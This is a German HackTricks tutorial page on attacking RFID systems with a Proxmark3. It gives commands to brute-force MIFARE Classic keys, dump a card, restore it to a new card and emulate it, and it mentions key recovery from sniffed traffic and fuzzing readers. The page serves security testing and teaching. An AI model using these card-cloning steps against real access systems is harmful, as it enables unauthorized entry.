# Proxmark 3

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS oder HackTricks im PDF-Format erhalten**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) bei oder der [**Telegram-Gruppe**](https://t.me/peass) oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**hacktricks-Repository**](https://github.com/carlospolop/hacktricks) **und das** [**hacktricks-cloud-Repository**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Angriff auf RFID-Systeme mit Proxmark3

Das erste, was Sie tun müssen, ist ein [**Proxmark3**](https://proxmark.com) zu haben und [**die Software und ihre Abhängigkeiten zu installieren**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux).

### Angriff auf MIFARE Classic 1KB

Es hat **16 Sektoren**, von denen jeder **4 Blöcke** hat und jeder Block **16B** enthält. Die UID befindet sich im Sektor 0 Block 0 (und kann nicht geändert werden).\
Um auf jeden Sektor zuzugreifen, benötigen Sie **2 Schlüssel** (**A** und **B**), die in **Block 3 jedes Sektors** gespeichert sind (Sektortrailer). Der Sektortrailer speichert auch die **Zugriffsbits**, die die **Lese- und Schreibberechtigungen** für **jeden Block** unter Verwendung der 2 Schlüssel geben.\
2 Schlüssel sind nützlich, um Berechtigungen zum Lesen zu geben, wenn Sie den ersten kennen, und zum Schreiben, wenn Sie den zweiten kennen (zum Beispiel).

Es können mehrere Angriffe durchgeführt werden.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Der Proxmark3 ermöglicht es, andere Aktionen wie das **Abhören** einer **Kommunikation zwischen Tag und Lesegerät** durchzuführen, um sensible Daten zu finden. Bei dieser Karte könnten Sie einfach die Kommunikation mitschneiden und den verwendeten Schlüssel berechnen, da die **kryptografischen Operationen schwach sind** und Sie ihn anhand von Klartext und Chiffretext berechnen können (`mfkey64`-Tool).

### Rohbefehle

IoT-Systeme verwenden manchmal **nicht marken- oder nicht kommerzielle Tags**. In diesem Fall können Sie den Proxmark3 verwenden, um benutzerdefinierte **Rohbefehle an die Tags zu senden**.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
Mit diesen Informationen könnten Sie versuchen, Informationen über die Karte und die Kommunikationsweise damit zu suchen. Proxmark3 ermöglicht das Senden von Rohbefehlen wie: `hf 14a raw -p -b 7 26`

### Skripte

Die Proxmark3-Software wird mit einer vorab geladenen Liste von **Automatisierungsskripten** geliefert, die Sie verwenden können, um einfache Aufgaben auszuführen. Um die vollständige Liste abzurufen, verwenden Sie den Befehl `script list`. Verwenden Sie anschließend den Befehl `script run`, gefolgt vom Namen des Skripts:
```
proxmark3> script run mfkeys
```
Sie können ein Skript erstellen, um **Tag-Reader zu fuzz**, indem Sie die Daten einer **gültigen Karte** kopieren und ein **Lua-Skript** schreiben, das **einen oder mehrere zufällige Bytes randomisiert** und überprüft, ob der **Reader bei jeder Iteration abstürzt**.

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}


<details>

<summary><strong>Erlernen Sie AWS-Hacking von Grund auf mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Arbeiten Sie in einem **Cybersicherheitsunternehmen**? Möchten Sie Ihr **Unternehmen in HackTricks beworben sehen**? Oder möchten Sie Zugriff auf die **neueste Version des PEASS erhalten oder HackTricks im PDF-Format herunterladen**? Überprüfen Sie die [**ABONNEMENTPLÄNE**](https://github.com/sponsors/carlospolop)!
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merchandise**](https://peass.creator-spring.com)
* **Treten Sie der** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie mir auf **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an das** [**HackTricks-Repository**](https://github.com/carlospolop/hacktricks) **und das** [**HackTricks-Cloud-Repository**](https://github.com/carlospolop/hacktricks-cloud) **senden**.

</details>
